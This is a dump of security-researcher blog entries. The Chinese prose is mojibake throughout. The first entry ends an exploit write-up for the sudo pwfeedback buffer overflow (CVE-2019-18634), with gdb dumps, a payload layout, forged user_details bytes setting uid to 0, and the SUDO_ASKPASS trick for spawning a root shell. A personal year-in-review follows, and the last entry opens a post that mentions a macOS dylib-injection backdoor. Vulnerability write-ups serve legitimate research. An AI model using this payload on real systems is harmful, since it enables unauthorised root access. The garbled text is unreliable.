&#x3D; 0x41414141,</span><br><span class="line">  gid &#x3D; 0x41414141,</span><br><span class="line">  egid &#x3D; 0x41414141,</span><br><span class="line">  username &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  cwd &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  tty &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  host &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  shell &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  groups &#x3D; 0x4141414141414141,</span><br><span class="line">  ngroups &#x3D; 0x41414141,</span><br><span class="line">  ts_cols &#x3D; 0x41414141,</span><br><span class="line">  ts_lines &#x3D; 0x41414141</span><br><span class="line">&#125;</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šæƒ³å¦‚æœæˆ‘ä»¬æŠŠ uid è¦†ç›–æˆ0 ä¼šæ€ä¹ˆæ ·ï¼Ÿå¦å¤–åœ¨çœ‹ä»£ç çš„è¿‡ç¨‹ä¸­ä¸€æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 276</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fork a child and exec sudo-askpass to get the password from the user.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">sudo_warn(U_(<span class="string">&quot;unable to run %s&quot;</span>), askpass);</span><br><span class="line">_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ execl çš„å‚æ•° askpass æ˜¯å‰é¢è¢«è¦†ç›–çš„å˜é‡ä¹‹ä¸€ï¼Œæ„Ÿè§‰åé¢ä¼šç”¨åˆ°ã€‚ç„¶ååœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 211</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NSIG; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (signo[i]) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> SIGTSTP: <span class="comment">// 18</span></span><br><span class="line"><span class="keyword">case</span> SIGTTIN: <span class="comment">// 21</span></span><br><span class="line"><span class="keyword">case</span> SIGTTOU: <span class="comment">// 22</span></span><br><span class="line">    <span class="keyword">if</span> (suspend(i, callback) == <span class="number">0</span>)</span><br><span class="line">need_restart = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    kill(getpid(), i);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¡åœ¨äº† è¿™é‡Œï¼Œsigno ä¹Ÿæ˜¯æˆ‘ä»¬è¦†ç›–çš„å˜é‡ä¹‹ä¸€ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30x &amp;signo</span><br><span class="line">0x5583b72413e0 &lt;signo&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72413f0 &lt;signo+16&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241400 &lt;signo+32&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241410 &lt;signo+48&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241420 &lt;signo+64&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241430 &lt;signo+80&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241440 &lt;signo+96&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241450 &lt;signo+112&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241460 &lt;signo+128&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241470 &lt;signo+144&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241480 &lt;signo+160&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241490 &lt;signo+176&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414a0 &lt;signo+192&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414b0 &lt;signo+208&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414c0 &lt;signo+224&gt;:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ signo è¢«è¦†ç›–æˆäº† 0x41414141 * N ï¼Œä»ä»£ç é€»è¾‘çœ‹ï¼Œæˆ‘ä»¬å¾—ä¸ºç©ºæ‰èƒ½é¿å…è¢« kill æ‰ï¼Œä½†ç”±äºæˆ‘ä»¬çš„ æ­¤æ—¶çš„ PoC2 æ˜¯ä»¥ <code>chr(0)</code> ä½œç»“å°¾çš„ï¼Œæ‰€ä»¥ signo æ­¤æ—¶å¿…ä¸èƒ½ä¸º <code>\x00</code>, é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬åªèƒ½æ¢æˆ PoC1 å»è°ƒè¯•ã€‚ç´§æ¥ç€å¦å¤–ä¸€ä¸ªé—®é¢˜åˆæ¥äº†ï¼Œç”±äº PoC1 æ˜¯ pty å½¢å¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åšä»¥ä¸‹é¡ºåº</p><ol><li>è¿è¡Œ gdb</li><li>æŒ‚è½½è°ƒè¯•å™¨</li><li>ç„¶åæ‰æ˜¯ socat å‘½ä»¤</li></ol><p>ä¸ç„¶ å¯èƒ½ä½ åˆšæŒ‚è½½ä¸Šå» ç¨‹åºå°± crash æ‰äº†</p><p>æˆ‘è¿™é‡Œç”¨äº†ä¸€ä¸ªæ›´è ¢çš„æ–¹æ³•ï¼Œå°±æ˜¯ é€šè¿‡ gdb å¼ºè¡Œ set å…³é”®çš„æ•°æ®ï¼Œè¿™æ ·è™½ç„¶æ…¢äº†ä¸€ç‚¹ï¼Œä½†é¿å…äº†æˆ‘æ¥ç€å»è§£å†³ gdb è°ƒè¯•sudo çš„é—®é¢˜</p><p>æ‰€ä»¥åˆ°æ­¤æ—¶ï¼Œæ€è·¯å°±æ˜¯é™¤äº† user_details çš„å†…å®¹ï¼Œå…¶ä»–æˆ‘ä»¬å…ˆé»˜è®¤è¦†ç›–ä¸º 0 ï¼Œåˆ™ payloadä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x00\x15&quot; * buf_size + &quot;\x00\x15&quot; * signo_sz + &quot;\x00&quot; * tgetpass_flags + &quot;\x00&quot; *24+ user_details + ...</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œè¿™é‡Œåˆä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/exploit$ ./exploit.sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing:</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">sudo: 1 incorrect password attempt</span><br><span class="line">Exploiting!</span><br></pre></td></tr></table></figure><p>ç„¶åç¿»ä»£ç çš„æ—¶å€™ï¼ŒçŒœæµ‹æ˜¯ <strong>tgetpass_flag</strong> æœ‰é—®é¢˜ï¼Œä¸èƒ½æ˜¯ â€œ\x00\x00\x00\x00â€ ,å› ä¸ºæˆ‘ä»¬æœ€åå¯èƒ½è¦ç”¨åˆ° sudo_askpassh è¿™ä¸ªå‡½æ•°ï¼Œ</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" style="zoom:50%;" /></a><p>åœ¨ä»£ç é‡Œå’Œ sudo_askpassh æœ‰å…³çš„å­—æ ·å¥½åƒæ˜¯ TGP_ASKPAS ,çœ‹åˆ°æœ‰å…³å®å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for tgetpass()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO0x00<span class="comment">/* turn echo off reading pw (default) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ECHO0x01<span class="comment">/* leave echo on when reading passwd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_STDIN0x02<span class="comment">/* read from stdin, not /dev/tty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ASKPASS0x04<span class="comment">/* read from askpass helper program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_MASK0x08<span class="comment">/* mask user input when reading */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO_TRY0x10<span class="comment">/* turn off echo if possible */</span></span></span><br></pre></td></tr></table></figure><p>é‚£å¤§æ¦‚å°±æ˜¯ 0x4äº† æ‰€ä»¥è¿™é‡Œè®¾ç½®ä¸º â€œ\x04\x00\x00\x00â€ï¼Œé‚£å‰©ä¸‹çš„ <strong>user_details</strong> ç»“æ„ä½“æ€ä¹ˆåŠï¼Ÿ æœ€ç®€å•çš„åŠæ³•å°±æŠ„ä¸€ä¸ªï¼Œç„¶åå°† uid å­—æ®µè®¾ç½®ä¸º 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_details &#x3D; &quot;\x53\x87\x00\x00\x47\x87\x00\x00\x53\x87\x00\x00\x53\x87\x00\x00\x76\x3d\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯æˆ‘ä» gdb ç›´æ¥æ‰‹æŠ„çš„ï¼Œå¹¶å°† uid è®¾ç½®ä¸º0</p><p>æœ€å åŠ ä¸Šè¶³å¤Ÿé•¿çš„ ç»“æŸç¬¦ å’Œ â€œ\nâ€ å°±å®Œæˆäº†æ•´ä¸ª exploit ï¼Œå¦å¤– ç”±äºæˆ‘ä»¬è¦ææƒï¼Œæ‰€ä»¥å¾—äº‹å‰å†™å¥½ä¸€ä¸ª shell , set uid å¹¶æ‰§è¡Œä¸€ä¸ªshellã€‚</p><p>ä¸”åœ¨æ‰§è¡Œ exploitçš„æ—¶å€™è¦è®¾ç½® SUDO_ASKPASS ç¯å¢ƒå˜é‡ä¸ºæ‰§è¡Œç¨‹åºè·¯å¾„</p><h2 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h2><p><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE"><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" title="asciicast" class="gallery-item"><img src="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" alt="asciicast"></a></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-18634 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goodbye 2019,Hello 2020!</title>
      <link href="Goodbye_2019,Hello_2020!.html"/>
      <url>Goodbye_2019,Hello_2020!.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Goodbye-2019"><a href="#Goodbye-2019" class="headerlink" title="Goodbye 2019"></a>Goodbye 2019</h2><p>2019 å¹´ï¼Œä»å­¦ç”Ÿåˆ°å®‰å…¨ç ”ç©¶å‘˜â€¦ ç»å†äº†ä¸€é˜µå­çš„èŒ«ç„¶ï¼Œä½†æ˜¯ä¹Ÿé€æ¸æ‰¾åˆ°äº†è‡ªå·±çš„æ–¹å‘.</p><h3 id="1æœˆ"><a href="#1æœˆ" class="headerlink" title="1æœˆ"></a>1æœˆ</h3><p>åœ¨åä¸ºè¿›è¡Œä»£ç å®¡è®¡ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦é€šè®¯é¢†åŸŸçš„ä¸€äº›ç›¸å…³åè®®ï¼Œä»¥åŠç›¸å…³åè®®ä»£ç å®ç°ã€‚ä¸»è¦æ˜¯3GPP<br> 3G ã€4Gã€5G ç­‰ç›¸å…³çš„å†…å®¹</p><h3 id="2æœˆ"><a href="#2æœˆ" class="headerlink" title="2æœˆ"></a>2æœˆ</h3><p>æ˜¥èŠ‚å‡æœŸå›å®¶ï¼Œå·²ç»æ„Ÿè§‰å¥½ä¹…æ²¡å›å®¶äº†ï¼Œä»Šå¹´è¿™ä¸ªæ—¶å€™æ•´ç†äº† 2018 è‡ªå·±çš„ç»å†ã€‚</p><ul><li>å»äº†æµ·è¾¹</li><li>å»äº†ä»¥å‰çš„é«˜ä¸­</li></ul><p>å‡æœŸç»“æŸï¼Œåˆå›äº†åä¸ºï¼Œæ¥ç€å®¡ä»£ç  Orz</p><h3 id="3æœˆ"><a href="#3æœˆ" class="headerlink" title="3æœˆ"></a>3æœˆ</h3><ul><li>å›å…¬å¸æäº†ä¸€äº› IoT è®¾å¤‡ï¼Œè·¯ç”±ã€æ‘„åƒå¤´éƒ½æœ‰</li><li>3æœˆ23æ—¥å’Œå©´å®å»çœ‹äº†éŸ³ä¹ä¼šï¼Œè®²é“ç†æˆ‘çœŸå¬ä¸æ‡‚ Orz</li><li>ä¸­é—´æäº†ä¸€æ®µæ—¶é—´ä¸€äº› VPN è®¾å¤‡</li></ul><h3 id="4æœˆ"><a href="#4æœˆ" class="headerlink" title="4æœˆ"></a>4æœˆ</h3><p>4æœˆä»½ï¼Œè¿™ä¸ªæ—¶å€™å‡†å¤‡å›å­¦æ ¡å®‰å¿ƒåšæ¯•ä¸šè®¾è®¡äº†â€¦èŠ±äº†å¤§æ¦‚ä¸€ä¸ªæœˆæ—¶é—´å®Œæˆäº†è‡ªå·±çš„æ¯•è®¾â€¦ä¸»è¦è¿˜æ˜¯æ•°æ®å¤„ç†ï¼ŒPython å¯¹ç®€åŒ–æˆ‘çš„å·¥ä½œèµ·åˆ°äº†å¾ˆå¤§çš„ä½œç”¨</p><h3 id="5æœˆ"><a href="#5æœˆ" class="headerlink" title="5æœˆ"></a>5æœˆ</h3><p>5æœˆä»½çš„æ—¶å€™ï¼Œæ¯•è®¾åŸºæœ¬å®Œæˆäº†ï¼Œè®ºæ–‡ä¹ŸåŸºæœ¬æˆç¨¿ã€‚</p><p>ä¸­æ—¬çš„æ—¶å€™ï¼Œå»äº† TW å½“æ¯•ä¸šæ—…è¡Œäº†â€¦</p><ul><li>é€›äº†å°åŒ—ï¼Œç„¶åå»äº†èŠ±è²ï¼Œç©äº†æ»‘ç¿”ä¼</li><li>ç„¶ååˆå›åˆ°å°åŒ—ï¼Œå»äº†å°åŒ—101ï¼Œé€›äº†å°åŒ—çš„ä¹¦åº—ï¼Œä¹°äº†ä¸€æœ¬ä¹¦ï¼šã€Šä¸€ä¹å››â‘¨ å¤§æ±Ÿå¤§æµ·ã€‹</li></ul><p>é€›å®Œå°åŒ—ï¼Œ5æœˆåº•å›å­¦æ ¡æ‹äº†å­¦é™¢æ¯•ä¸šç…§ï¼Œè·ç¦»æ¯•ä¸šæ›´è¿‘äº†</p><h3 id="6æœˆ"><a href="#6æœˆ" class="headerlink" title="6æœˆ"></a>6æœˆ</h3><p>6æœˆåˆçš„æ—¶å€™ï¼Œr3kapig æ‰¿åŠäº†â€Bâ€CTF DEFCON CHINA â€¦è¢«æ‹‰å»äº†åŒ—äº¬å½“è¿ç»´</p><p>å›äº†å­¦æ ¡ï¼Œç­çº§ä¹Ÿæ‹äº†è‡ªå·±çš„æ¯•ä¸šç…§ï¼Œè¿™å¤§æ¦‚æ˜¯å¤§å®¶æœ€åçš„ä¸€æ¬¡åˆç…§äº†</p><p>6æœˆ9å·..å»äº†ä¸Šæµ· å†²åˆºDEFCON Finalçš„æœ€åä¸€å¼ é—¨ç¥¨ â€” 0CTF Finalã€‚æœ€å10åˆ†é’Ÿçš„æ—¶å€™è¿å‡ºä¸¤ä¸ªé¢˜ï¼Œç»æ€Balsnï¼Œne0 tql (ä¸å¥½æ„æ€..â€æˆ‘ä»¬æœ‰400äººå‘¢ï¼â€œ)</p><p>6æœˆ27æ—¥ï¼Œç”Ÿæ—¥ + ç­çº§çš„å‘Šåˆ«èšé¤ï¼Œè¿™ä¸€å¤©ä¹Ÿæ­£å¼è®¤è¯†äº†æˆ‘ç°åœ¨çš„å¥³æœ‹å‹â€¦6æœˆ29æ—¥ï¼Œæˆ‘å¤§æ¦‚æ˜¯æˆ‘ä»¬ç­æœ€åç¦»å¼€äº†å®¿èˆï¼Œç¦»å¼€äº†å­¦æ ¡çš„äººå§..ç¦»å¼€çš„æ—¶å€™ï¼Œæ‹äº†ä¸å°‘ç…§ç‰‡</p><p>ä¸­é—´è¿›è¡Œäº†GeekPwn åä¸ºä¸“åœºå¤‡èµ›</p><h3 id="7æœˆ"><a href="#7æœˆ" class="headerlink" title="7æœˆ"></a>7æœˆ</h3><p>7æœˆ5å· chaitin 5å‘¨å¹´å¹´ä¼šï¼Œå“ˆå“ˆ ï¼Œåªä¸­äº†ä¸ªä¸‰ä»¶å¥—</p><p>7æœˆ6å· 360 ä¸–ç•Œé»‘å®¢å¤§å¸ˆèµ›ï¼Œæˆ‘å¹´ä¼šç»“æŸåæ‰“è½¦å»äº†é…’åº—å¸®å¿™åšé¢˜â€¦æœ€åæ‹¿äº†ä¸ªç¬¬ä¸‰</p><p>7æœˆ20æ—¥ ï¼Œè¹­äº†ä¸ªçœ‹é›ªè®ºå›</p><p>7æœˆ24æ—¥ï¼Œå»äº†ä¸Šæµ· æ‰“äº†å‰é¢å…­æœˆä»½å‡†å¤‡å®Œæˆçš„GeekPwn åä¸ºä¸“åœºï¼Œè®ºâ€œä»ä¸€ä¸ªå‚æ•°æ³¨å…¥åˆ°å‘½ä»¤æ‰§è¡Œâ€</p><h3 id="8æœˆ"><a href="#8æœˆ" class="headerlink" title="8æœˆ"></a>8æœˆ</h3><p>è¹­äº†ä¸ª â€œé è°±é»‘å®¢éŸ³ä¹èŠ‚â€çš„ç¥¨ï¼Œå‘¨æœ«å»ç©äº†ä¸‹ã€‚é¡ºä¾¿ä¸€è¯´ï¼Œæˆ‘çš„ç¾å›½ç­¾è¯æŒ‚äº†..</p><p>r3kpaig DEFCON 27 CTF Final 11â€¦</p><p>8æœˆ24æ—¥,Kcon é‡åˆ°äº†å¥½ä¹…æ²¡è§çš„ lowkey</p><p>8æœˆ25æ—¥ï¼Œäº”æœˆå¤© 2019 Just Rock It ï¼ï¼ï¼ Blue åŒ—äº¬ç«™ï¼Œç¬¬ä¸€æ¬¡å»çœ‹æ¼”å”±ä¼šã€‚ä¸­é—´è¿˜æ”¯æ’‘äº†ogeekçš„çº¿ä¸Šæ¯”èµ›ï¼Œå¬æ¼”å”±ä¼šå¬åˆ°ä¸€åŠï¼Œå¬åˆ°é¢˜ç›®å›æ»šçš„æ—¶å€™ï¼Œsandboxç‚¸äº† â€¦å“­äº†</p><p>8æœˆ29æ—¥ï¼Œå»é•¿æ˜¥å‡ºå·®ï¼Œé¡ºä¾¿å’Œå°å¢¨ã€åŒ»ç”Ÿé¢åŸº</p><h3 id="9æœˆ"><a href="#9æœˆ" class="headerlink" title="9æœˆ"></a>9æœˆ</h3><p>Ogeekç»“æŸï¼Œç­¹å¤‡ RWCTF Online ,ä½†æ˜¯æˆ‘é¢˜ç”±äºæŸäº›åŸå› ï¼Œè¢«å¹²äº†ï¼Œå‡ºé¢˜å¤±è´¥..äºæ˜¯å’Œ@leommxj å‡†å¤‡GeekPwn 2014 ä¸Šæµ·ç«™çš„é¡¹ç›®ï¼Œæˆ‘ä»¬è¿™æ¬¡é€‰å®šäº†ï¼Œå…¬å¸çš„æŠ•å½±è®¾å¤‡ï¼Œå‡†å¤‡åšä¸ªè •è™«é“¾ã€‚</p><p>æåˆ°ä¸€åŠï¼Œå…¬å¸åˆæ¥äº†ä¸ªä»£ç å®¡è®¡çš„æ´»ï¼Œè¿™æ¬¡æ˜¯å»äº†å—äº¬åä¸ºã€‚åªå¥½ä¸­é—´å‰©ä¸‹çš„ä¸œè¥¿ç”±@explorer å’Œ@leommxjå®Œæˆã€‚</p><h3 id="10æœˆ"><a href="#10æœˆ" class="headerlink" title="10æœˆ"></a>10æœˆ</h3><p>å›½åº†7å¤©å’Œå¥³æœ‹å‹åœ¨å—äº¬åº¦è¿‡..</p><ul><li><p>å¤«å­åº™</p></li><li><p>ç§¦æ·®æ²³</p></li><li><p>ä¸­å±±é™µ</p></li><li><p>å—äº¬åšç‰©é¦†</p></li><li><p>é›¨èŠ±å°</p><p>â€¦..</p></li></ul><p>10æœˆ24æ—¥ å»äº†ä¸Šæµ·å‚åŠ GeekPwn ,æŒ‘æˆ˜ååˆ†é¡ºåˆ©ï¼Œæ¯”èµ›ç»“æŸåï¼Œé¡ºä¾¿å›åŒ—äº¬å–äº†å†¬å¤©çš„è¡£æœï¼Œé¡ºä¾¿ä¸€è¯´ï¼Œç§‹å¤©çš„768è›®å¥½çœ‹</p><h3 id="11æœˆ"><a href="#11æœˆ" class="headerlink" title="11æœˆ"></a>11æœˆ</h3><p>ä»ç„¶åœ¨å—äº¬åä¸ºå®¡è®¡ä»£ç â€¦</p><p>11æœˆä¸­æ—¬çš„æŸä¸ªå‘¨æœ«å»çœ‹å¥³æœ‹å‹äº†</p><p>11æœˆ23å·åï¼Œé¡¹ç›®ç»“æŸï¼Œå›åŒ—äº¬ç­¹å¤‡ RWCTF Final çš„é¢˜ç›®ï¼Œæ–¹å‘æ˜¯æ‰“å°æœºâ€¦æˆ‘ä»¬å†³å®šä» IPP å…¥æ‰‹ï¼Œé€‰æ‹©äº† cupsd çš„ä»£ç </p><p>wpè§ï¼š<a href="https://github.com/bash-c/rwctf2019-final-printer">https://github.com/bash-c/rwctf2019-final-printer</a></p><p>11æœˆ30æ—¥ï¼ŒåŒ—äº¬ä¸‹é›ªäº† </p><h3 id="12æœˆ"><a href="#12æœˆ" class="headerlink" title="12æœˆ"></a>12æœˆ</h3><p>12æœˆ6æ—¥ï¼ŒRWCTF Final å¼€å¯ï¼Œå»å¹´æ˜¯é€‰æ‰‹ï¼Œä»Šå¹´æ˜¯å·¥ä½œäººå‘˜ï¼Œæœ‰ç‚¹å”å˜˜ã€‚</p><p>RWCTF ç»“æŸåï¼Œçªç„¶æ¡åˆ°äº†å°ç±³æ‰“å°æœºçš„ä¸€ä¸ªæ´ï¼Œæ‹¿åˆ°äº†ç¬¬ä¸€ä¸ªshellï¼Œä¹‹ååˆæœ‰äº†ä¸€ç‚¹äº§å‡º..233</p><p>12æœˆ28æ—¥ï¼Œå’Œå¥³æœ‹å‹å»å¤©æ´¥ç©äº†ä¸¤å¤©ï¼Œåäº†å¤©æ´¥ä¹‹çœ¼</p><h2 id="Hello-2020"><a href="#Hello-2020" class="headerlink" title="Hello 2020"></a>Hello 2020</h2><p>â€œåªäº‰æœå¤•ï¼Œä¸è´ŸéŸ¶åâ€</p><p>å¸Œæœ›èƒ½æœ‰æ›´å¤šçš„äº§å‡ºå§ </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¼–è¯‘å±æ€§ &quot;__attribute__&quot; çš„ä¸€äº›ç®€å•è®¤è¯†</title>
      <link href="Compile_attribute_properties.html"/>
      <url>Compile_attribute_properties.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰ç«¯æ—¶é—´ï¼Œåœ¨æ‰“geekpwnçš„æ—¶å€™ï¼Œéœ€è¦åšåé—¨ï¼Œä¸€å¼€å§‹æˆ‘åšçš„æ˜¯macosçš„åé—¨ï¼Œç”¨çš„æ˜¯ macos dylibæ³¨å…¥ï¼ˆåŠ«æŒï¼Ÿï¼‰ã€‚</p><p>è¿™é‡Œå¯ä»¥æä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯è¿™ä¸ªé¡¹ç›®<a href="https://github.com/Tyilo/insert_dylib">insert_dylib</a>ï¼Œæ›¾ç»çœ‹è¿‡æœ‰äººç”¨è¿™ä¸ªé¡¹ç›®ï¼Œå»æ‰äº†macosä¸Šä¼ä¸šå¾®ä¿¡çš„æ°´å°ï¼Œæ‰€ä»¥ä¸€ç›´æœ‰ç‚¹å°è±¡ã€‚</p><p>ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼šinsert @executable_path src dst</p><p>æœ€åèƒ½ç±»ä¼¼è¿™æ ·çš„ä¸€ä¸ªæ•ˆæœï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png"></a></p><p>çº¢è‰²æ¡†çš„ï¼Œæ˜¯æˆ‘æ³¨å…¥çš„dylib 